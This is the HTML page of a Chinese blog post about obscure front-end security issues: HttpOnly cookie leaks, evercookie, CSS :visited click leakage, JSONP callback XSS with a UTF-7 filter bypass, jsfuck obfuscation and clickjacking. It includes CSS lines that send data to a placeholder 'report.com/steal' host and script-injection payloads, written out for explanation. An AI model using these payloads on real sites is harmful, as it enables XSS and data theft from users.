@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <title>那些前端安全冷门知识 | 欢迎来到匡盟盟的博客！</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta name="keywords" content="匡盟盟, Mengmeng Kuang, Blog, 博客" />
+
+
+  <meta name="google-site-verification" content="3YclHsmiu1_poywYScAg4jt4RGqoHUoIXQJFV5vEZ1I" />
+
+
+  <meta name="baidu-site-verification" content="d6tIQA0tgL" />
+
+
+  <meta name="description" content="零、概述 提起web前端安全，大家都会想到两个名词：xss和csrf。 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。  大概分为以下章节：  盗取无法用js读写的Cookie 删不掉的本地存储  函数覆写监听上报  内存Cookie与硬盘Cookie  CSS带来的点击量泄露  JSONP回调函数与UTF-7编码  过滤与代码混淆  心理学与社会工程学   资料">
+  <meta name="keywords" content="web,前端,冷门">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="那些前端安全冷门知识">
+  <meta property="og:url" content="http://home.meng.uno/articles/23b9d6e9/index.html">
+  <meta property="og:site_name" content="欢迎来到匡盟盟的博客！">
+  <meta property="og:description" content="零、概述 提起web前端安全，大家都会想到两个名词：xss和csrf。 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。  大概分为以下章节：  盗取无法用js读写的Cookie 删不掉的本地存储  函数覆写监听上报  内存Cookie与硬盘Cookie  CSS带来的点击量泄露  JSONP回调函数与UTF-7编码  过滤与代码混淆  心理学与社会工程学   资料">
+  <meta property="og:locale" content="EN">
+  <meta property="og:image" content="http://www.meng.uno/images/safety/1.jpg">
+  <meta property="og:image" content="http://www.meng.uno/images/safety/2.jpg">
+  <meta property="og:image" content="http://www.meng.uno/images/safety/3.jpg">
+  <meta property="og:image" content="http://www.meng.uno/images/safety/4.jpg">
+  <meta property="og:image" content="http://www.meng.uno/images/safety/5.jpg">
+  <meta property="og:updated_time" content="2018-03-20T06:59:57.000Z">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="那些前端安全冷门知识">
+  <meta name="twitter:description" content="零、概述 提起web前端安全，大家都会想到两个名词：xss和csrf。 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。  大概分为以下章节：  盗取无法用js读写的Cookie 删不掉的本地存储  函数覆写监听上报  内存Cookie与硬盘Cookie  CSS带来的点击量泄露  JSONP回调函数与UTF-7编码  过滤与代码混淆  心理学与社会工程学   资料">
+  <meta name="twitter:image" content="http://www.meng.uno/images/safety/1.jpg">
+  <meta name="twitter:creator" content="@kuangmengmeng">
+  <link rel="publisher" href="mengmengkuang">
+  <meta property="fb:admins" content="kuangmengmeng">
+  <meta property="fb:app_id" content="1559086807462632">
+
+  <link rel="alternate" href="/atom.xml" title="欢迎来到匡盟盟的博客！" type="application/atom+xml">
+
+
+
+
+  <link rel="icon" id="myid" href="/css/images/logo.png">
+  <link rel="apple-touch-icon" id="myid" href="/css/images/logo.png">
+
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face {
+      font-family: futura-pt;
+      src: url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");
+      font-weight: 500;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: futura-pt;
+      src: url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");
+      font-weight: 500;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: futura-pt;
+      src: url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");
+      font-weight: lighter;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: futura-pt;
+      src: url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");
+      font-weight: 400;
+      font-style: italic;
+    }
+  </style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <link rel="stylesheet" href="/css/prism-duotone-sea.css">
+
+
+  <link rel="stylesheet" href="/css/dialog.css">
+
+
+
+
+
+  <link rel="stylesheet" href="/css/header-post.css">
+
+
+
+
+
+  <link rel="stylesheet" href="/css/vdonate.css">
+
+
+
+
+  <!-- 
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":["copy","weixin","linkedin","sqq","tsina","twi","fbook","mail"],"bdPic":"","bdStyle":"0","bdSize":"16"},"slide":{"type":"slide","bdImg":"0","bdPos":"left","bdTop":"100"},"selectShare":{"bdContainerClass":null,"bdSelectMiniList":["qzone","tsina","tqq","renren","weixin"]}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+ -->
+
+
+
+
+
+  <link rel="canonical" href="http://home.meng.uno/articles/23b9d6e9/" />
+
+  <link rel="stylesheet" href="/css/animate.css">
+  <link rel="stylesheet" href="/css/loading.css">
+
+  <script>
+    var linkEle = document.getElementById("myid");
+    var tmplink = linkEle.href;
+
+    var tmptitle = document.title;
+    document.addEventListener('visibilitychange', function() {
+      var isHidden = document.hidden;
+      if (isHidden) {
+        document.title = '喔唷，崩溃啦！';
+        linkEle.href = '/css/images/avatar.png';
+      } else {
+        document.title = tmptitle;
+        linkEle.href = tmplink;
+
+      }
+    });
+
+
+    function Hide() {
+      var mychar = document.getElementById("homelogoback").style.display = "none";
+    }
+  </script>
+
+  <script defer src="https://use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+
+
+</head>
+
+
+<body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+
+  <div id="container">
+    <div id="wrap">
+
+      <header>
+        <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+          <div class="navbar-inner">
+            <div class="container">
+              <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+
+              <a class="brand" style="
+                 border-width: 0px;  margin-top: 0px;" href="#" data-toggle="modal" data-target="#myModal">
+                  <img class="img-rotate" style="box-shadow:1px 1px 10px 3px #e5e5e5; border-radius: 50%;" width="124px" height="124px" alt="匡盟盟的博客" src="/css/images/logo.png">
+              </a>
+
+
+              <div class="navbar-collapse collapse">
+                <ul class="hnav navbar-nav">
+
+                  <li> <a class="main-nav-link" href="http://home.meng.uno">Home</a> </li>
+
+                  <li> <a class="main-nav-link" href="http://articles.meng.uno">Archives</a> </li>
+
+                  <li> <a class="main-nav-link" href="http://categories.meng.uno">Categories</a> </li>
+
+                  <li> <a class="main-nav-link" href="http://tags.meng.uno">Tags</a> </li>
+
+                  <li> <a class="main-nav-link" href="http://about.meng.uno">About</a> </li>
+
+                  <li> <a class="main-nav-link" href="http://comments.meng.uno">留言板</a> </li>
+
+                  <li>
+                    <div id="search-form-wrap">
+
+                      <form class="search-form">
+                        <input type="text" style="width=0;" class="ins-search-input search-form-input" placeholder="" />
+                        <button type="submit" class="search-form-submit"></button>
+                      </form>
+                      <div class="ins-search">
+                        <div class="ins-search-mask"></div>
+                        <div class="ins-search-container">
+                          <div class="ins-input-wrapper">
+                            <input type="text" class="ins-search-input" placeholder="Type something..." />
+                            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+                          </div>
+                          <div class="ins-section-wrapper">
+                            <div class="ins-section-container"></div>
+                          </div>
+                        </div>
+                      </div>
+                      <script>
+                        (function(window) {
+                          var INSIGHT_CONFIG = {
+                            TRANSLATION: {
+                              POSTS: 'Posts',
+                              PAGES: 'Pages',
+                              CATEGORIES: 'Categories',
+                              TAGS: 'Tags',
+                              UNTITLED: '(Untitled)',
+                            },
+                            ROOT_URL: '/',
+                            CONTENT_URL: '/content.json',
+                          };
+                          window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+                        })(window);
+                      </script>
+                      <script src="/js/insight.js"></script>
+
+                    </div>
+                  </li>
+
+                </ul>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+      </header>
+
+      <script>
+        (function(w, i, d, g, e, t, s) {
+          w[d] = w[d] || [];
+          t = i.createElement(g);
+          t.async = 1;
+          t.src = e;
+          s = i.getElementsByTagName(g)[0];
+          s.parentNode.insertBefore(t, s);
+        })(window, document, '_gscq', 'script', '//widgets.getsitecontrol.com/125646/script.js');
+      </script>
+
+
+      <div id="content" class="outer">
+
+        <section id="main" style="float:none;">
+          <article id="post-safety-front-end" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
+            <div id="articleInner" class="article-inner">
+
+
+              <header class="article-header">
+                <h1 class="thumb" class="article-title" itemprop="name">
+                  那些前端安全冷门知识
+                </h1>
+              </header>
+
+              <div class="article-meta">
+                <a href="/articles/23b9d6e9/" class="article-date">
+	  <time datetime="2016-05-27T15:52:00.000Z" itemprop="datePublished">2016-05-27</time>
+	</a>
+                <a class="article-category-link" href="/categories/web/">web</a>
+                <a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	<span class="post-count"> | 字数2,719</span>
+	<span class="post-count"> | 预计时间10分钟</span>
+	</a>
+              </div>
+              <div class="article-entry" itemprop="articleBody">
+
+                <h1>零、概述</h1>
+                <p>提起web前端安全，大家都会想到两个名词：<code>xss</code>和<code>csrf</code>。<br> 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。
+                </p>
+                <p>大概分为以下章节：</p>
+                <blockquote>
+                  <p>盗取无法用js读写的Cookie<br> 删不掉的本地存储
+                    <br> 函数覆写监听上报
+                    <br> 内存Cookie与硬盘Cookie
+                    <br> CSS带来的点击量泄露
+                    <br> JSONP回调函数与UTF-7编码
+                    <br> 过滤与代码混淆
+                    <br> 心理学与社会工程学
+                  </p>
+                </blockquote>
+                <p>资料略多，文章较长，请自备瓜子…</p>
+                <h1>一、盗取无法用js读写的Cookie</h1>
+                <p>为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。</p>
+                <figure class="highlight plain">
+                  <table>
+                    <tr>
+                      <td class="gutter">
+                        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
+                      </td>
+                      <td class="code">
+                        <pre><span class="line">setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // 设置普通Cookie</span><br><span class="line">setcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启</span><br></pre>
+                      </td>
+                    </tr>
+                  </table>
+                </figure>
+                <p>我们还是可以通过一些服务器上的漏洞去获取它们。</p>
+                <h2 id="调试信息泄露">调试信息泄露</h2>
+                <p>比较经典的是PHP的phpinfo文件：</p>
+                <p><img src="http://www.meng.uno/images/safety/1.jpg" alt="phpinfo文件"></p>
+                <p>如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。<br> 访问phpinfo.php，将看到：
+                </p>
+                <p><img src="http://www.meng.uno/images/safety/2.jpg" alt=""></p>
+                <p>其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。</p>
+                <h2 id="apache-2-2-x版本请求头超长泄露">Apache 2.2.x版本请求头超长泄露</h2>
+                <p>Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。</p>
+                <p>因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。</p>
+                <p><img src="http://www.meng.uno/images/safety/3.jpg" alt=""></p>
+                <h1>三、删不掉的本地存储</h1>
+                <p>如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且&quot;永久&quot;寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。</p>
+                <p>但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：</p>
+                <blockquote>
+                  <p>Cookie - 是最常见的方式，key-value 模式<br> UserData - IE自己的本地存储，key-value 模式<br> localStorage - HTML5 新增的本地存储，key-value 模式<br> local Database - HTML5 新增的浏览器本地DataBase，是SQLite 数据库<br> Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器</p>
+                </blockquote>
+                <p>除去这些，我还收集了一些比较“偏门”的存储方案：</p>
+                <blockquote>
+                  <p>Silverlight的IsolatedStorage - 类似HTML5 localStorage<br> PNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值<br> HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容<br> Web History，利用的是“CSS 判断目标URL
+                    是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）<br>
+                    <a href="http://window.name" target="_blank" rel="noopener">window.name</a>，本质就是一个DOM 存储，并不存在本地。</p>
+                </blockquote>
+                <p>老外Samy Kamkar用半天开发了一个JavaScript API：<a href="http://en.wikipedia.org/wiki/Evercookie" target="_blank" rel="noopener">evercookie</a>。</p>
+                <p>该API利用了上面的全部存储手段，将“<code>永不丢失你的cookie</code>”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。</p>
+                <h1>四、函数覆写监听上报</h1>
+                <p>覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：<code>搞跨站的人总习惯用alert来确认是否已成功跨站</code>，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。</p>
+                <figure class="highlight plain">
+                  <table>
+                    <tr>
+                      <td class="gutter">
+                        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
+                      </td>
+                      <td class="code">
+                        <pre><span class="line">function log(s) &#123;</span><br><span class="line">    var img = new Image();</span><br><span class="line">    img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);</span><br><span class="line">&#125;</span><br><span class="line">var _alert = alert;</span><br><span class="line">window.alert = function(s) &#123;</span><br><span class="line">    log(alert.caller);</span><br><span class="line">    _alert(s);</span><br><span class="line">&#125;</span><br></pre>
+                      </td>
+                    </tr>
+                  </table>
+                </figure>
+                <p>如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…</p>
+                <p>其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：<a href="http://www.xfocus.net/articles/200712/963.html" target="_blank" rel="noopener">浅谈javascript函数劫持</a>。</p>
+                <h1>五、内存Cookie与硬盘Cookie</h1>
+                <p><code>内存Cookie</code> - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁</p>
+                <p><code>硬盘Cookie</code> - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期</p>
+                <p>我们很容易得出结论：内存Cookie更安全。因此，某些站点会把<code>敏感信息放到内存Cookie</code>里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。</p>
+                <p>因此，这里有两个关注点：</p>
+                <ol>
+                  <li>敏感信息还是不要放Cookie里，即使是内存Cookie；</li>
+                  <li>服务器要做Cookie的三个维度的校验 - 唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。</li>
+                </ol>
+                <h1>六、CSS带来的点击量泄露</h1>
+                <p>在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。<br> 假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。
+                  <br> 试想这是一个
+                  <code>导航栏组件</code>，html代码是这样的：</p>
+                <figure class="highlight plain">
+                  <table>
+                    <tr>
+                      <td class="gutter">
+                        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
+                      </td>
+                      <td class="code">
+                        <pre><span class="line">&lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt;</span><br></pre>
+                      </td>
+                    </tr>
+                  </table>
+                </figure>
+                <p>你忽略掉的css写成这样：</p>
+                <figure class="highlight plain">
+                  <table>
+                    <tr>
+                      <td class="gutter">
+                        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
+                      </td>
+                      <td class="code">
+                        <pre><span class="line">#a1:visited &#123;background: url(http://report.com/steal?data=a1);&#125;</span><br><span class="line">#a2:visited &#123;background: url(http://report.com/steal?data=a2);&#125;</span><br><span class="line">#a3:visited &#123;background: url(http://report.com/steal?data=a3);&#125;</span><br></pre>
+                      </td>
+                    </tr>
+                  </table>
+                </figure>
+                <p>我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的<code>点击数据量</code>就暴露给第三方了！</p>
+                <p>当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…</p>
+                <p>HTML5提供伪类<code>::selection</code>，当指定对象区域被选择时，就会触发。其原理跟上面类似。</p>
+                <h1>七、JSONP回调函数与UTF-7编码</h1>
+                <h2 id="基本原理">基本原理</h2>
+                <p>在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：<br>
+                  <code>cgi-bin/get_jsonp?id=123&amp;call_back=some_function</code></p>
+                <p>返回数据格式为：<br>
+                  <code>some_function([{'id':123, data:'some_data'}]);</code><br> 如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。
+                </p>
+                <p>请求：<br>
+                  <code>cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
+                <p>返回：<br>
+                  <code>&lt;script&gt;alert(1);&lt;/script&gt;([{'id':123, data:'some_data'}]);</code></p>
+                <p>所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？</p>
+                <h2 id="ie解析utf-7漏洞">IE解析UTF-7漏洞</h2>
+                <p>比较简单的过滤方法，是过滤<code>&lt;&gt;</code>字符，使得无法构成html标签。但在IE6\IE7的某些版本中，存在以下漏洞：<strong>如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析</strong>（IE7后续版本已发布补丁修复）。</p>
+                <p>在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上&quot;+/v8&quot;头：<br>
+                  <code>cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4</code></p>
+                <p>这时候巧妙的躲开了<code>&lt;&gt;</code>过滤，而返回：<br>
+                  <code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’});</code></p>
+                <p>这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。</p>
+                <h1>八、过滤与代码混淆</h1>
+                <p>过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：<a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">jsfuck</a>。</p>
+                <p>站名如其名，满满的恶意…它可以仅仅用6个字符：<code>[]()!+</code>去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句<code>alert(1)</code>编码成了3009个字符，并执行成功：</p>
+                <p><img src="http://www.meng.uno/images/safety/4.jpg" alt=""></p>
+                <p>所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。</p>
+                <h1>九、心理学与社会工程学</h1>
+                <p>有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：</p>
+                <h2 id="诱导触发拖拽事件">诱导触发拖拽事件</h2>
+                <p>比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？</p>
+                <p>很简单，添加一张图片：</p>
+                <p><img src="http://www.meng.uno/images/safety/5.jpg" alt=""></p>
+                <p>注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。</p>
+                <h2 id="传说中的qq空间-传染病毒">传说中的QQ空间“传染病毒”</h2>
+                <p>步骤是这样的：</p>
+                <ol>
+                  <li>A(始作俑者)发布了一条说说：<code>这个网站很好玩，快来试试吧~ http://xxx.xxx</code></li>
+                  <li>A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面</li>
+                  <li>好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）</li>
+                  <li>一传十十传百，越传越广…</li>
+                </ol>
+                <p>但真实的情况跟CSRF没一点关系。玄妙在于：<code>好友们打开链接后干了什么事情？</code></p>
+                <p>这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？<br> 用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…
+                </p>
+                <p>有人会问，这不是CSRF吗？还真不是。做法却很简单：</p>
+                <p>“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是<code>点击了iframe中的转发按钮</code>。真是令人万万没想到。</p>
+                <p><br><br>本文链接： <a href="http://home.meng.uno/articles/23b9d6e9/">http://home.meng.uno/articles/23b9d6e9/</a> 欢迎转载！</p>
+
+              </div>
+              <footer class="article-footer">
+
+                <!-- Go to www.addthis.com/dashboard to customize your tools -->
+
+                <div id="wpac-rating" style="margin: 10px auto; text-align:center;"></div>
+                <script type="text/javascript">
+                  wpac_init = window.wpac_init || [];
+                  wpac_init.push({
+                    widget: 'Rating',
+                    id: 9986
+                  });
+                  (function() {
+                    if ('WIDGETPACK_LOADED' in window) return;
+                    WIDGETPACK_LOADED = true;
+                    var mc = document.createElement('script');
+                    mc.type = 'text/javascript';
+                    mc.async = true;
+                    mc.src = 'https://embed.widgetpack.com/widget.js';
+                    var s = document.getElementsByTagName('script')[0];
+                    s.parentNode.insertBefore(mc, s.nextSibling);
+                  })();
+                </script>
+
+                <div id="donation_div"></div>
+
+                <script src="/js/vdonate.js"></script>
+                <script>
+                  var a = new Donate({
+                    title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
+                    btnText: 'Donate', // 可选参数，打赏按钮文字
+                    el: document.getElementById('donation_div'),
+                    wechatImage: 'http://www.meng.uno/money/wechat.JPG',
+                    alipayImage: 'http://www.meng.uno/money/alipay.JPG'
+                  });
+                </script>
+
+
+                <div id="comment">
+                  <!-- 来必力City版安装代码 -->
+                  <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDA2OC8xMDYwNg==">
+                    <script type="text/javascript">
+                      (function(d, s) {
+                        var j, e = d.getElementsByTagName(s)[0];
+
+                        if (typeof LivereTower === 'function') {
+                          return;
+                        }
+
+                        j = d.createElement(s);
+                        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                        j.async = true;
+
+                        e.parentNode.insertBefore(j, e);
+                      })(document, 'script');
+                    </script>
+                    <noscript>为正常使用评论功能请激活JavaScript</noscript>
+                  </div>
+                  <!-- City版安装代码已完成 -->
+                </div>
+
+                <ul class="article-tag-list">
+                  <li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li>
+                  <li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/冷门/">冷门</a></li>
+                  <li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端/">前端</a></li>
+                </ul>
+              </footer>
+            </div>
+
+            <nav id="article-nav">
+
+              <a href="/articles/3171f70f/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          JS中call、apply、bind的用法
+        
+      </div>
+    </a>
+
+
+              <a href="/articles/1ae8cec4/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Virtio原理</div>
+    </a>
+
+            </nav>
+
+          </article>
+
+          <!-- Table of Contents -->
+
+          <aside id="toc-sidebar">
+            <div id="toc" class="toc-article">
+              <strong class="toc-title">Contents</strong>
+
+              <ol class="nav">
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">零、概述</span></a></li>
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">一、盗取无法用js读写的Cookie</span></a>
+                  <ol class="nav-child">
+                    <li class="nav-item nav-level-2"><a class="nav-link" href="#调试信息泄露"><span class="nav-number">2.1.</span> <span class="nav-text">调试信息泄露</span></a></li>
+                    <li class="nav-item nav-level-2"><a class="nav-link" href="#apache-2-2-x版本请求头超长泄露"><span class="nav-number">2.2.</span> <span class="nav-text">Apache 2.2.x版本请求头超长泄露</span></a></li>
+                  </ol>
+                </li>
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">三、删不掉的本地存储</span></a></li>
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">四、函数覆写监听上报</span></a></li>
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">5.</span> <span class="nav-text">五、内存Cookie与硬盘Cookie</span></a></li>
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">6.</span> <span class="nav-text">六、CSS带来的点击量泄露</span></a></li>
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">7.</span> <span class="nav-text">七、JSONP回调函数与UTF-7编码</span></a>
+                  <ol class="nav-child">
+                    <li class="nav-item nav-level-2"><a class="nav-link" href="#基本原理"><span class="nav-number">7.1.</span> <span class="nav-text">基本原理</span></a></li>
+                    <li class="nav-item nav-level-2"><a class="nav-link" href="#ie解析utf-7漏洞"><span class="nav-number">7.2.</span> <span class="nav-text">IE解析UTF-7漏洞</span></a></li>
+                  </ol>
+                </li>
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">8.</span> <span class="nav-text">八、过滤与代码混淆</span></a></li>
+                <li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">9.</span> <span class="nav-text">九、心理学与社会工程学</span></a>
+                  <ol class="nav-child">
+                    <li class="nav-item nav-level-2"><a class="nav-link" href="#诱导触发拖拽事件"><span class="nav-number">9.1.</span> <span class="nav-text">诱导触发拖拽事件</span></a></li>
+                    <li class="nav-item nav-level-2"><a class="nav-link" href="#传说中的qq空间-传染病毒"><span class="nav-number">9.2.</span> <span class="nav-text">传说中的QQ空间“传染病毒”</span></a></li>
+                  </ol>
+                </li>
+              </ol>
+
+            </div>
+          </aside>
+        </section>
+
+      </div>
+
+
+      <footer id="footer">
+
+
+        <div class="container">
+          <div class="row">
+            <p id="copyRightEn">&copy; 2018.02.08 - 2020.06.01 <a href="http://www.meng.uno/">Mengmeng Kuang</a>&nbsp;<i class="fas fa-cogs"></i> 保留所有权利！</p>
+
+            <p class="busuanzi_uv">
+
+              UV : <span id="busuanzi_value_site_uv"></span> | PV : <span id="busuanzi_value_site_pv"></span>
+
+            </p>
+
+
+            <p id="hitokoto">:D 获取中...</p>
+            <!-- 以下写法，选取一种即可 -->
+
+            <!-- 现代写法，推荐 -->
+            <!-- 兼容低版本浏览器 (包括 IE)，可移除 -->
+            <script src="https://cdn.bootcss.com/bluebird/3.5.1/bluebird.core.min.js"></script>
+            <script src="https://cdn.bootcss.com/fetch/2.0.3/fetch.min.js"></script>
+            <!--End-->
+            <script>
+              fetch('https://v1.hitokoto.cn')
+                .then(function(res) {
+                  return res.json();
+                })
+                .then(function(data) {
+                  var hitokoto = document.getElementById('hitokoto');
+                  hitokoto.innerText = data.hitokoto;
+                })
+                .catch(function(err) {
+                  console.error(err);
+                })
+            </script>
+
